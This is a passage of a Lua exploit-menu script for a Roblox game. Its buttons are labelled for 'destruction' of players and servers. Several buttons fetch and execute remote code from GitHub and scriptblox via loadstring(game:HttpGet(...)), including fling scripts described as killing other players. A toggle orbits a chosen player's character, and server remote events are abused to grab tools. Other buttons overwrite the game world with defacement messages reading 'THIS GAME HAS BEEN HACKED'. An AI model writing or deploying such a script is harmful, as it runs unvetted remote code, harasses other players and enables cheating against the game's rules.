          end
          game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -475, 0)
    end
  })
  AddSection(Main, {"Destruction on Player"})
 
  local Dropdown = AddDropdown(Main, {
      Name = "Choose Player",
      Default = "",
      Options = killAdvancedPlayerList,
      Callback = function(value)
          selectedPlayer = Players:FindFirstChild(value);
      end
  })
  AddToggle(Main, {
      Name = "Start Destruction",
      Default = false,
      Callback = function(value)
          orbiting = value;
          if (orbiting and selectedPlayer) then
              while orbiting do
                  local targetPosition =
                      selectedPlayer.Character.HumanoidRootPart
                          .Position;
                  local orbitPosition = targetPosition +
                                              Vector3.new(
                                                  math.cos(tick() * 20) *
                                                      5, 0, math.sin(
                                                      tick() * 20) * 5);
                  local tweenInfo = TweenInfo.new(0.05,
                                                  Enum.EasingStyle
                                                      .Linear,
                                                  Enum.EasingDirection
                                                      .InOut);
                  local tween =
                      TweenService:Create(
                          LocalPlayer.Character.HumanoidRootPart,
                          tweenInfo,
                          {CFrame = CFrame.new(orbitPosition)});
                  tween:Play();
                  tween.Completed:Wait();
              end
          end
      end
  });
 
  AddButton(Main, {
    Name = "Script that kills people with Couch",
    Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
    end
  })
  AddButton(Main, {
    Name = "Get the Couch",
    Callback = function()
      local args={[1]="PickingTools",[2]="Couch"};game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
    end
  })
  local infiniteJumpEnabled = false
 
  -- Connect the jump event only once
  local infiniteJumpConnection
 
  -- Callback function for the infinite jump toggle button
  local function onInfiniteJumpToggle(value)
 
  infiniteJumpEnabled = value
      print("Infinite Jump Enabled:", infiniteJumpEnabled)
     
      -- Connect the jump event only once
      if not infiniteJumpConnection then
          infiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
              if infiniteJumpEnabled then
                  local player = game.Players.LocalPlayer
                  local character = player.Character
                  if character and character:FindFirstChildOfClass("Humanoid") then
                      character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
                  end
              end
          end)
      end
  end
 
  AddButton(Main, {
    Name = "Script that flies or kills anyone who flies you",
    Callback = function()
  loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-FE-Fling-GUI-10927"))()
    end
  })
 
  AddButton(Main, {
    Name = "Script no one can fly you",
    Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))()
    end
  })
  AddSection(Main, {"Weapon Colors"})
  AddButton(Main, {
   Name = "Grenade Weapon",
   Callback = function()
         local args = {
      [1] = "RequestingGunSkins",
      [2] = "11528005848"
  }
  
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))
  
     end
  })
  AddButton(Main, {
   Name = "Scary Weapon",
   Callback = function()
         local args = {
      [1] = "RequestingGunSkins",
      [2] = "668614178"
  }
  
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))
  
     end
  })
  local Main = MakeTab({Name = "{Server Destruction} "})
AddSection(Main, {"Destruction only shows K"})
AddButton(Main, {
  Name = "1Destruction",
  Callback = function()
    local s = Instance.new("Sky")
    s.Name = "Sky"
    s.Parent = game.Lighting
    local skyboxID = 94946856358988
    local skyboxURL = "http://www.roblox.com/asset/?id="..skyboxID
    s.SkyboxBk = skyboxURL
    s.SkyboxDn = skyboxURL
    s.SkyboxFt = skyboxURL
    s.SkyboxLf = skyboxURL
    s.SkyboxRt = skyboxURL
    s.SkyboxUp = skyboxURL
    game.Lighting.TimeOfDay = "12:00:00"
  end
})
AddButton(Main, {
  Name = "2Destruction",
  Callback = function()
  local decalID = 94946856358988
function exPro(root)
   for _, v in pairs(root:GetChildren()) do
      if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..decalID then
         v.Parent = nil
      elseif v:IsA("BasePart") then
         v.Material = "Plastic"
         v.Transparency = 0
         for _, face in ipairs({"Front", "Back", "Right", "Left", "Top", "Bottom"}) do
            local d = Instance.new("Decal", v)
            d.Texture = "http://www.roblox.com/asset/?id="..decalID
            d.Face = face
         end
      end
      exPro(v)
   end
end
function asdf(root)
   for _, v in pairs(root:GetChildren()) do
      asdf(v)
   end
end
exPro(game.Workspace)
asdf(game.Workspace)
  end
})
AddButton(Main, {
  Name = "Destruction",
  Callback = function()
  -- Configuration --
local Message = "THIS GAME HAS BEEN HACKED BY CONCHKIDD"
local mes2text = "YOU ALL MUST PERISH IN MY FIRE OF DEATH!"
-- Don't touch unless you know what You're doing --
local mes = Instance.new("Hint")
mes.Parent = workspace
mes.Text = Message
game.Lighting:ClearAllChildren()
game.Lighting.FogEnd = 100
game.Lighting.FogColor = Color3.new(0, 0, 0)
local sound = Instance.new("Sound")
sound.Parent = workspace
sound.Looped = true
sound.PlaybackSpeed = 0.3
sound.Volume = 5
sound.SoundId = "rbxassetid://1842908121"
sound:Play()
local mes2 = Instance.new("Message")
mes2.Parent = workspace
mes2.Text = mes2text
for i, v in pairs(workspace:GetDescendants()) do
if v:IsA("BasePart") and v.Parent:IsA("Model") then
local outline = Instance.new("SelectionBox")
v.Name = Message
outline.Parent = v
outline.Adornee = v
outline.Color3 = Color3.new(1, 1, 1)
v.Color = Color3.new(0, 0, 0)
local fire = Instance.new("Fire")
fire.Parent = v
fire.Size = 100
fire.Color = Color3.new(1, 1, 1)
local sky = Instance.new("Sky")
sky.CelestialBodiesShown = false
sky.Parent = game.Lighting
sky.SkyboxUp = "http://www.roblox.com/asset/?id=99915080584370"
sky.SkyboxBk = "http://www.roblox.com/asset/?id=99915080584370"
sky.SkyboxDn = "http://www.roblox.com/asset/?id=99915080584370"
sky.SkyboxRt = "http://www.roblox.com/asset/?id=99915080584370"
sky.SkyboxLf = "http://www.roblox.com/asset/?id=99915080584370"
sky.SkyboxFt = "http://www.roblox.com/asset/?id=99915080584370"
local bill = Instance.new("BillboardGui")
local Text = Instance.new("TextLabel")
bill.Parent = v
bill.Adornee = v
bill.Size = UDim2.new(0, 200, 0, 200)
Text.Parent = bill
Text.Size = UDim2.new(0, 200, 0, 200)
Text.BackgroundTransparency = 1
Text.TextScaled = false
Text.TextSize = 30
Text.TextColor3 = Color3.new(1, 0, 0.0156863)
Text.TextTransparency = 0
Text.Font = Enum.Font.Cartoon
Text.Text = Message
end
end
  end
})
